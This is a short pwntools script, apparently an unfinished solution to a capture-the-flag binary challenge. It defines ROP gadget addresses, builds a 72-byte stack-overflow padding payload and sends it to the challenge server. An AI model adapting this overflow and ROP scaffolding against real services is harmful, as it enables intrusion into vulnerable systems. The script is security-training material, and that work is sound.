from pwn import *


# open fd 0 (stdin)
# write to stdin
# read stdin


pop_rax = p64(0x0000000000401196)
pop_rbp = p64(0x000000000040111d)
pop_rbx = p64(0x0000000000401198)

bss_mem = p64(0x0000000000404020)

offset = 72
payload = b"A" * offset



p = remote("cyberchallenge.disi.unitn.it", 9105)
p.sendline(payload)
print(p.recvall().decode(errors="ignore").split('\n')[0])

